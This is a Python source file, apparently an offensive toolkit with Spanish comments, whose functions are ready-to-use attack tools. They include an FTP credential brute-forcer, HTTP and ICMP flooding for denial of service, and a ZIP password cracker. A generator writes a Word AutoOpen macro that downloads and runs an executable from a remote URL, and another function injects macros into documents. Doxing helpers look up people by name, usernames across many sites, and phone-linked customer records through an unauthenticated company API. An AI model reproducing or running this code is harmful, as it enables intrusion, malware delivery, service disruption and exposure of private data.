import os
import sys
import time
import random
import base64
import zipfile
# import zipfile36 as zipfile 
# Descomentar en caso de ser incompatible con version python
import platform
import requests
import aspose.words as aw
from bs4 import BeautifulSoup
from tabulate import tabulate
from ftplib import FTP, error_perm, error_reply, error_temp

try:
    with open(".root", "r") as root_dir:
        ROOT_MAX = root_dir.readlines()[0]
except:
    print("[ERROR] setup.py Aun no ah sido ejecutado...")
    exit(0)

def findperson():

    def limpieza(limp):

        limp=limp.replace('{"',"")
        limp=limp.replace('"}',"")
        limp=limp.replace(",", "\n")
        
        limp=limp.replace('":"',"===>")
        limp=limp.replace(" ","=")

        limp=limp.split()

        for palabra in limp:

            if len(palabra) < 80 and '>"' not in palabra and "code" not in palabra and "matches" not in palabra and "None" not in palabra and "time" not in palabra and "message" not in palabra:

                if "dv" in palabra:
                    palabra="\n[NEXT PERSON]\n"
                
                palabra=palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT")

                if "CONTENT:[]" in palabra:
                    print("[ERROR] {} NO ENCONTRADA".format(nombre).upper())
                    break
                else:
                    print(palabra)

                #print(palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT"))


    def geo():

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }


        data= {
            
            "value":"{}".format(nombre),
            "ab":"false",

            filter:{

                "personas":"true",
                "empresas":"true",
                "lugares":"true",
                "argentina":"true",
                "bolivia":"false",
                "chile":"false",
                "colombia":"false",
                "guatemala":"false",
                "mexico":"false",
                "venezuela":"false"

                }
            
            }

        buscador=requests.post("https://www.genealog.cl/Geneanexus/search", headers=headers, data=data)

        save=open("a.txt", "w")
        save.write(buscador.text)
        save.close()

        save=open("a.txt")
        leer=save.readlines()

        for line in leer:

            if '{"' in line:
                resultados=line.replace("var result = ", "")
                save.close()
                os.remove("a.txt")
                #resultados_json=json.loads(resultados)

        return limpieza(resultados)


    ##### PRINCIPAL CODE
    print("""
[EXAMPLE] JHON DEE /G

[ARGENTINA] /A
[CHILE]     /C
[BOLIVIA]   /B
[COLOMBIA]  /C
[GUATEMALA] /G
[MEXICO]    /M
[VENEZUELA] /V

[ALL COUNTRY] /ALL
    """)

    try:

        nombre=input("Ingresa el nombre a buscar: ")

        while len(nombre) == 0 or "/" not in nombre:
            nombre=input("Ingresa el nombre a buscar: ")
        
    except:
        pass

    else:
        #nombre_temp=""
        fi_update={}

        fi={
            "personas":"true",
            "empresas":"true",
            "lugares":"true",
            "argentina":"/A",
            "bolivia":"/B",
            "chile":"/C",
            "colombia":"/C",
            "guatemala":"/G",
            "mexico":"/M",
            "venezuela":"/V"
            }
        
        if "/ALL" in nombre.upper():
            todos="true"

            nombre=nombre.replace(" /ALL", "")

            for key in fi.keys():
                
                fi_update.setdefault(key,todos)
                fi.update(fi_update)
        else:

            for key in fi.keys():

                if key != "personas" and key != "empresas" and key != "lugares":

                    if fi.get(key) in nombre.upper():
                        nombre_temp=nombre.replace(fi.get(key), "")

                        fi_update.setdefault(key,"true")    # DEPENDE DEL RESULTADO SE ACTUALIZA A TRUE O FALSE
                    else:
                        fi_update.setdefault(key,"false")

            fi.update(fi_update)
            nombre=nombre_temp
                


        data= {
        
        "value":"{}".format(nombre),
        "ab":"false","filter":fi
        
        }

        try:
            print(geo())
        except:
            print("[ERROR] ALGO SUCEDIO")
            pass

def ftpbrute():

    def menu():
        global selec

        print("""
    [01] Usuario multiple 
    [02] Usuario unico
    [03] Salir
    """)
        try:
            selec=int(input("ftpbrute->> "))

            while selec > 3 or selec < 1:

                selec=int(input("ftpbrute->> "))

        except:
            exit(0)


    def entradas():

        global usuario, password, ftpserver
        
        try:

            ftpserver=input("Introduce el url de inicio de sesion FTP: ")

            if selec == 1:
                usuario=input("Introduce la ruta del diccionario de usuarios: ")
            else:
                usuario=input("Introduce el nombre de usuario FTP: ")

            password=input("Introduce la ruta del diccionario de contraseñas: ")

            while len(usuario) <= 0 or len(password) <= 0:

                if selec == 1:
                    usuario=input("Introduce la ruta del diccionario de usuarios: ")
                else:
                    usuario=input("Introduce el nombre de usuario FTP: ")

                password=input("Introduce la ruta del diccionario de contraseñas: ")

        except:
            exit(0)

    def limpieza():

        if selec == 1:

            usuarios=open(usuario)
            lec_usuarios=usuarios.read()

            if " " in lec_usuarios:
                lec_usuarios=lec_usuarios.replace(" ","\n")

            usu_save=open(".tempusu", "w")
            usu_save.write(lec_usuarios)

            usu_save.close()
            usuarios.close()

        passw=open(password)
        pass_lec=passw.read()

        if " " in pass_lec:
            pass_lec=pass_lec.replace(" ", "\n")
        
        pass_save=open(".temppass", "w")
        pass_save.write(pass_lec)

        pass_save.close()
        passw.close()

    def vector(usuario,password,ftpserver):

        try:
            with FTP(ftpserver) as conect:
                conect.login(user=usuario, passwd=password)
        #conect.login(user=usuario,passwd=password) # TimeoutError

        except TimeoutError:
            print(f"[OUT] SERVIDOR NO RESPONDE EN ->> [U]-{usuario}-[P]-{password}")
        except (error_temp, error_perm, error_reply):
            print(f"[BAD] USUARIO Y CONTRASEÑA INVALIDO ->> [U]-{usuario}-[P]-{password}")
        except:
            print("[ERR] ALGO SUCEDIO X_X")
            exit(0)
        else:
            print(f"[GET] USUARIO Y CONTRASEÑA CORRECTOS ->> [U]-{usuario}-[P]-{password}")
            pausa=input("Presiona enter para continuar...")
            exit(0)


    def ataque():

        global usuario, ftpserver

        password_lines=open(".temppass")
        lines_pass=password_lines.readlines()

        if selec == 1:
            usuario_lec=open(".tempusu")
            lines=usuario_lec.readlines()

            for usuario in lines:
                usuario=usuario.replace("\n","")
                for password in lines_pass:

                    password=password.replace("\n","")
                    vector(usuario,password,ftpserver)

        if selec == 2:

            for password in lines_pass:

                password=password.replace("\n","")
                vector(usuario,password,ftpserver)
                



    ######################################################################################

    #try:
    menu()

    if selec == 1 or selec == 2:
        entradas()
        limpieza()
        print(f"[FTP] EMPEZANDO ATAQUE EN ->> {ftpserver}")
        ataque()

    if selec == 3:
        exit(0)

    #except:
    #exit(0)

def httpflood():

    def cookie_generator():

        global headers, cookies, cookie_pre
        AZAR=random.randint(1,10)

        cookie_pre=str(random.randint(9**100.65,9**101.65)).encode("utf-8")
        cookie_pre=base64.b64encode(cookie_pre*BYTESEND).decode("utf-8")

        #headers={"User-Agent":"{}".format(random_agents.get(AZAR))}
        headers={
            
            "User-Agent":f"{random_agents.get(AZAR)}",
            "Referer":f"https://www.{cookie_pre*BYTESEND}.com",
            "Cookie":f"{cookie_pre*BYTESEND}",
            "Authorization":f"{cookie_pre}",
            "Origin":f"{cookie_pre*BYTESEND}",
            "Cache-Control":"no-cache"

            }

        cookies={
            
            "{}".format(cookie_names.get(AZAR)):f"{cookie_pre}"

            }


    random_agents={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    cookie_names={

        1:"PHPSESSID",
        2:"JSESSIONID",
        3:"ga",
        4:"_gid",
        5:"_gat",
        6:"__cfduid",
        7:"__utmz",
        8:"cookieconsent_status",
        9:"csrftoken",
        10:"session-id"

    }

    try:
        URL=input("Ingresa url atacar: ")

        while len(URL) == 0 or "/" not in URL:
            URL=input("Ingresa url valida [http://] or [https://]: ")
            #BYTESEND=int(input("Cantidad de Bytes a enviar [10 TO 40]: "))

    except:
        pass
    else:
        BYTESEND=1
        status_max=200


        while True:

            try:
                while status_max == 200:
                    cookie_generator()
                    test=requests.get(URL, headers=headers, cookies=cookies) # UTILIZA POST SI ES VUL
                    status_max=test.status_code
                    print("[FIND] BUSCANDO PESO DE PAYLOAD ->> [{}] STATUS [{}]".format(BYTESEND,status_max))
                    
                    if status_max != 200:
                        BYTESEND=BYTESEND-1
                        proceso=cookie_pre*BYTESEND

                        proceso=sys.getsizeof(proceso)

                        terminal=1048576/proceso

                        print(f"[SET] PAYLOAD SIZE {round(proceso/1024,2)}KB ->> [200]\n[SET] EN {round(terminal)} SOLICITUDES HAY ->> 1MB")
                        time.sleep(5)
                    else:
                        BYTESEND=BYTESEND+1

            except:
                print("[ERROR] NOS HAN TIRADO X_X")
                exit(0)
            try:
                cookie_generator()
                atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
            except:
                print("[ERROR] NOS HAN TIRADO X_X")
                exit(0)
            else:

                if atak.status_code != 200:
                    print("[SERVER OUT] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))
                else:
                    print("[ATACANDO] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))

def icmpdos():

    SYS=platform.system().lower()

    try:
        ip=input("Introduce ip de destino: ")

        while len(ip) < 3 or len(ip) == 0:
            ip=input("Introduce ip de destino: ")

    except:
        pass

    else:

        while True:
            try:
                pack=int(input("Introduce el tamaño de tu paquete [MAX: 65500]: "))
                
                while pack <= 0 or pack > 65507:
                    pack=int(input("[ERROR] Introduce el tamaño de tu paquete [MAX: 65500]: "))
                
                
            except:
                pass
                
            else:
                
                print("ATACANDO => {} CON {}".format(ip,pack))

                if SYS == "windows":
                    os.system("ping -l {} -t {}".format(pack,ip))
                else:
                    os.system("ping -s {} {}".format(pack,ip))

def iplocate():

    def limpieza(limp):

        limp=limp.replace('": {'," [BLOCK]\n")
        limp=limp.replace("{","")
        limp=limp.replace(",","")
        limp=limp.replace('"',"")
        limp=limp.replace("}","\n")
        limp=limp.replace("  ","")
        limp=limp.replace(":","->>")
        
        return limp.upper()
        


    headers={

        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",

    }

    try:

        ip=input("Introduce la ip a localizar: ")

        while len(ip) == 0 or len(ip) < 4:
            ip=input("Introduce la ip a localizar: ")

    except:
        pass

    else:

        try:
            localizando=requests.get(f"https://ipinfo.io/widget/demo/{ip}", headers=headers)
        except:
            print(f"[ERROR] NO INTERNET OR BAD IP ->> {ip}")
            pass
        else:
            print(limpieza(localizando.text))

def lopiapi():

    def legible(json):
        
        
        if "," in json or "}" in json:
            
            
            json=json.replace("{","")
            json=json.replace("}","")
            json=json.replace(",","\n\n")
            json=json.replace('"','')
            json=json.replace("[", "")
            json=json.replace("]", "")
            json=json.upper()
            
            return json
            
        else:
            return "\n[ERROR] NO JSON\n"
            


        
    try:
        
        numero=input("Ingresa el numero de telefono: ")
        
        while len(numero) < 9 or len(numero) > 9:
            
            numero=input("Ingresa el numero de telefono: ")
            
    except:
        pass
                
    else:
        
        try:
            consulta=requests.get("https://api-lipiapp.lipigas.cl/wapi/no_auth/usuarios/terminos/{}".format(numero))
            
            consulta_n=requests.get("https://api-lipiapp.lipigas.cl/wapi/clientes?telefono={}&pais=cl&segmento=1".format(numero))
                                
            print("\n"+legible(consulta.text)+"\n"+legible(consulta_n.text)+"\n")
        
        except:
            print("\n[ERROR] NO CONECTION 404\n")
            
        input("Presiona enter para continuar...")

def macromaker():

    def down():

        lec=macro_in_cache.replace("url_mgtols", rem)
        lec=lec.replace("archivo_mgtols", rem_2)

        escribe=open("macro.vb","w")
        escribe.write(lec)
        escribe.close()

        return "[MACRO] ===> MACRO.VB" 

        
    macro_in_cache="""
Sub AutoOpen()
    Dim url As String
    Dim destino As String
    Dim objShell As Object
    
    ' URL del archivo a descargar
    url = "url_mgtols"
    
    ' Ruta donde guardar el archivo (temporal en este caso)
    destino = Environ("TEMP") & "\\archivo_mgtols"
    
    ' Crear objeto Shell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Descargar archivo
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    
    ' Guardar archivo y ejecutarlo si se descargo correctamente
    If http.Status = 200 Then
        Open destino For Binary As #1
        Put #1, , http.responseBody
        Close #1
        objShell.Run destino
        Set objShell = Nothing
    Else
        Set objShell = Nothing
    End If
    
End Sub
    """


    try:
        
        selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

        while selec <= 0 or selec > 3:
            selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

    except:
        pass

    else:

        if selec == 1:

            try:
                rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")
                
                while len(rem) == 0:
                    rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")

                rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")

                while len(rem_2) == 0:
                    rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")


            except:
                pass
            else:
                try:
                    print(down())
                except:
                    print("[ERROR] ALGO SALIO MAL")
                    pass
        
        if selec == 2:
            print("[OPTION] EN DESARROLLO")

def seeker():

    try:

        down_url = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/url_dox.txt")

        save_dw = open(".bdd", "w")
        save_dw.write(down_url.text)
        save_dw.close()
        
    except:
        
        print("[ERROR] No tienes conexion a internet...")
    

    status_codes = {

        200: "Posible Coincidencia",
        201: "Creado",
        202: "Aceptado",
        203: "Información no autorizada",
        204: "Sin contenido",
        205: "Restablecer contenido",
        206: "Contenido parcial",
        207: "Multi-estado",
        208: "Ya reportado",
        226: "IM utilizado",
        400: "Solicitud incorrecta",
        401: "No autorizado",
        402: "Pago requerido",
        403: "Prohibido",
        404: "No encontrado",
        405: "Método no permitido",
        406: "No aceptable",
        407: "Se requiere autenticación de proxy",
        408: "Tiempo de espera agotado",
        409: "Conflicto",
        410: "Gone (El recurso ya no está disponible y no lo estará nuevamente)",
        411: "Longitud requerida",
        412: "Precondición fallida",
        413: "Carga útil demasiado grande",
        414: "URI demasiado larga",
        415: "Tipo de medio no soportado",
        416: "Rango no satisfactorio",
        417: "Expectativa fallida",
        418: "Soy una tetera (código de estado de broma)",
        421: "Solicitud mal dirigida",
        422: "Entidad no procesable",
        423: "Bloqueado",
        424: "Dependencia fallida",
        425: "Demasiado pronto",
        426: "Se requiere actualización",
        428: "Requisito previo necesario",
        429: "Demasiadas solicitudes",
        431: "Campos de encabezado de solicitud demasiado grandes",
        451: "No disponible por razones legales",
        500: "Error interno del servidor",
        501: "No implementado",
        502: "Puerta de enlace incorrecta",
        503: "Servicio no disponible",
        504: "Tiempo de espera de la puerta de enlace agotado",
        505: "Versión HTTP no soportada",
        506: "La variante también negocia",
        507: "Almacenamiento insuficiente",
        508: "Bucle detectado",
        510: "No extendido",
        511: "Se requiere autenticación de red"

    }

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    headers= { # Especifica los valores necesarios para que get funcione correctamente
        
        "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Expires': '0'
        
    }

    def pausa():
        input("\nPresiona enter para continuar...")


    def buscador():
        global usuario

        while True:
            
            try:
                
                usuario=input("Nombre de usuario a buscar: ")
                
                while len(usuario) == 0:
                    usuario=input("Nombre de usuario a buscar: ")
                    
            except:
                pass
            
            else:
                print("[Tipo de busqueda] ===> [URL] A [{}]\n[Buscando en 800 <sitios>]".format(usuario))
                
                leer=open(".bdd")
                lectura=leer.readlines()
                
                save=open("capture.txt", "w")
                for word in lectura:
                    
                    if "\n" in word:
                        word=word.replace("\n","")
                    
                    try:
                        word=word.replace("name_find", usuario) # Reemplaza el name_find del diccionario por el usuario
                        soli=requests.get(word, timeout=20)           
                        
                        if soli.status_code == 200:
                            save.write("\n[URL] "+word)
                        #a=soli.status_code
                        
                        print("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))

                    except:
                        pass
                        
                # Bloque de finalizacion
                
                save.close()
                leer.close()

                print("\nSiguiente busqueda: [IN WEB]->>60 sec")

                time.sleep(60)
                siguiente()
                break

    def siguiente():
        print("[Tipo de busqueda] ===> [IN WEB] A [{}]\n".format(usuario))

        head_up={
            "User-Agent": "{}".format(random_usera.get(random.randint(1,10)))
            }
        
        headers.update(head_up)

        red=[]
        base="https://www.bing.com"
        busca= '/search?q="{}"'.format(usuario)

        try:
            dox=requests.get(base+busca, headers=headers)
            time.sleep(2)
        except:
            pass

        else:
            save=open("capture.txt", "a")
            sopa=BeautifulSoup(dox.text, "html.parser") # Obtengo la web en etiquetas
            
            for word in sopa.find_all("a"): # Busco parametros <a en sopa

                palabra=str(word.get("href")) # Obtengo la etiqueta especifica href

                if "https://" in palabra:
                    print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                    save.write("\n[URL] {}".format(palabra))
                
                if "first=" in palabra:
                    red.append(palabra)
            
            for word in red:

                try:
                    dox=requests.get(base+word, headers=headers)
                    time.sleep(2) # SI SE DESCOMENTA, NO SE ALCANZA A LEER COMPLETA LA PAGINA /ALL time.sleep
                except:
                    pass
                
                else:
                    sopa=BeautifulSoup(dox.text, "html.parser")
                    
                    for word_soup in sopa.find_all("a"):

                        palabra=str(word_soup.get("href"))

                        if "https://" in palabra:
                            print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                            save.write("\n[URL] {}".format(palabra))

            print("\nDatos de {} guardados en capture.txt!!".format(usuario))
            pausa()
            save.close()

            exit(0)

    buscador()

def tempmail():

    MAIL="https://mailnesia.com/mailbox/"
    mail_complemento="https://mailnesia.com"


    def limpieza(limp):
        
        limp=limp.replace("\n\n","\n")
        limp=limp.replace("\n\n\n\n\n\n","\n")
        limp=limp.replace("\n\n","\n")

        temp=open(".temp", "w", encoding="utf-8")
        temp.write(limp)
        temp.close()

        temp=open(".temp", encoding="utf-8")
        lectura=temp.readlines()

        temp_2=open(".temp_2", "w", encoding="utf-8")
        for line in lectura:

            if "https://" in line or "·" in line or "на русском языке" in line:
                ok=False
            else:
                temp_2.write(line)
        
        temp_2.close()
        temp.close()

        limp=open(".temp_2", encoding="utf-8")
        limp=limp.read()

        return limp


    try:
        correo=input("Ingresa tu nombre o alias: ")

        while "@" in correo or " " in correo or len(correo) <= 0:
            correo=input("Ingresa tu nombre o alias: ")

    except:
        pass

    else:

        try:
            solicitud=requests.get(MAIL+correo)
        
        except:
            pass

        else:
            push=0
            check=[]
            check_final={}
            check_str=None

            sopa=BeautifulSoup(solicitud.text, "html.parser")

            for link in sopa.find_all("a"):

                bandeja=str(link.get("href"))
                
                if correo+"/" in bandeja:
                    check.append(bandeja)
            try:
                for link in check:

                    if link != check_str:

                        push+=1
                        check_str=link
                        check_final.setdefault(push,mail_complemento+link)
            except:
                pass
            else:
                print("[EMAIL] {}@mailnesia.com ===> [LISTO PARA USAR]".format(correo))
                print("[PUSH] Mensajes: {}".format(push))

                if push > 0:
                    try:
                        selec=int(input("Ingresa el email a leer [1/{}]: ".format(push)))

                        while selec <= 0 or selec > push:
                            selec=int(input("[ERROR] Ingresa el email a leer [1/{}]: ".format(push)))
                    except:
                        pass
                    else:
                        
                        get_mensaje=requests.get(check_final.get(selec))
                        sopa=BeautifulSoup(get_mensaje.text, "html.parser")

                        print(limpieza(sopa.get_text()))
                        print("[ALTERNATIVA] ===> {}".format(check_final.get(selec)))             

def unzipper():

    def limpieza():

        limp=open(dic)
        esp=limp.read()

        abrir=open(".bbd", "w")

        if " " in esp:

            esp=esp.replace(" ","\n")

        
        abrir.write(esp)
        
        abrir.close()
        limp.close()

    def crack():

        diccionario_abrir=open(".bbd")
        linea=diccionario_abrir.readlines()

        for password in linea:

            if "\n" in password:
                password=password.replace("\n", "")

            with zipfile.ZipFile(directiorio_archivo, "r") as filesx:
                filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
            
        diccionario_abrir.close()


    try:
        
        dic=input("Ingresa ruta de tu diccionario: ")

        while len(dic) <= 0:
            dic=input("Ingresa ruta de tu diccionario: ")
        
        directiorio_archivo=input("Ingresa ruta de tu zip a decifrar: ")

        while len(directiorio_archivo) <= 0:
            directiorio_archivo=input("Ingresa ruta de tu zip a decifrar: ")
            
    except:
        pass

    else:
        try:
            limpieza()
        except:
            print("\n[ERROR] Diccionario no existente!!")
            pass
        
        try:
            crack()
        except NotImplementedError:
            print("[ERROR] Formato de compresion no soportado!!")
        except FileNotFoundError:
            print("[ERROR] Archivo dañado o no existente!!")
        except:
            pass

def webdumper():

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }


    getted = []
    extensiones_comunes = [".php", ".html", ".asp", ".aspx", ".jsp", ".cgi", ".pl"]

    def get_dic(enlace, nombre):

        try:

            dic_down = requests.get(enlace)

            archivo_dic = open(nombre, "w")
            archivo_dic.write(dic_down.text)
            archivo_dic.close()

        except:
            print("[ERROR] No tienes conexion a internet...")

    def inicial_find(url, dic_path):

        dict = open(dic_path, "r")
        dict_line = dict.readlines()

        if f"/test_script" not in f"{url}test_script": # Chekea si tiene una / al final para los directorios
            url = url + "/"

        for palabra in dict_line:

            palabra = palabra.replace("\n", "")
            url_100 = f"{url}{palabra}"

            if "//" in url_100:
                url_100 = url_100.replace("//", "/")
                url_100 = url_100.replace(":/", "://")
            
            headers = { # Especifica los valores necesarios para que get funcione correctamente
                
                "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Expires': '0'
                
            }

            finder = requests.get(url_100, headers=headers, timeout=8)

            if finder.status_code == 200 or finder.status_code == 403:

                if finder.status_code == 403:
                    sig = "PROTEGIDO"
                elif finder.status_code == 200:
                    sig = "ENCONTRADO"

                if url_100 != url and [url_100, finder.status_code, sig] not in getted:
                    getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional

            print(f"[URL] {url_100} ->> {finder.status_code}")

    def recursive_find(dic_path, tipo):

        if getted != []:

            if tipo == "path":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)
            
            elif tipo == "arch":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)


    try:
        select = int(input("""
01) Fast Fuzzing
02) Slow Fuzzing
                        
Opcion a utilizar: """))


        url = input("Ingresa la url: ")
        print("---Si no tienes un diccionario presiona ENTER---")
        dic_path = input("Ingresa la ruta de tu diccionario: ")
        print("------------------------------------------------")

        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/path.txt", "path.txt")
        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/arch.txt", "arch.txt")

        if select == 1:
            if dic_path == "":
                dic_path = "path.txt" # Ubicacion del script base
            inicial_find(url, dic_path) # Obtiene los directorios ocultos
        elif select == 2: 
            inicial_find(url, "path.txt") # Obtiene los enlaces disponibles 

            recursive_find("path.txt", "path") # Luego intenta con los sub enlaces de esos mismos
            recursive_find("arch.txt", "arch")

        print("\n")
        
        if getted != []:
            print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
        else:
            print("[ERROR] No se han encontrado directorios ocultos...")
            
    except KeyboardInterrupt:
        print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
    except ValueError:
        print("[ERROR] Caracter no valido...")

def wordinfect():

    def integracion():

        # Load Word document.
        doc = aw.Document(ruta)
        leer=open(macro)

        # Create VBA project
        project = aw.vba.VbaProject()
        project.name = "MacroProject"
        doc.vba_project = project

        # Create a new module and specify a macro source code.
        module = aw.vba.VbaModule()
        module.name = "MacroModule"
        module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
        module.source_code = leer.read()

        # Add module to the VBA project.
        doc.vba_project.modules.add(module)

        # Save document.
        doc.save(ruta_save)


    try:

        ruta=input("Ingresa la ruta de tu documento [.docm]: ")

        while len(ruta) < 0 or ".docm" not in ruta:
            ruta=input("Ingresa la ruta de tu documento [.docm]: ")

        macro=input("Introduce la ruta de tu macro: ")

        while len(macro) < 0:
            macro=input("Introduce la ruta de tu macro: ")
        
    except:
        pass

    else:
        try:
            ruta_save=ruta.replace(".docm","_2.docm")
            integracion()
        except:
            pass
        else:
            print("[WORD INFECTADO] ===> {}".format(ruta_save))

#################################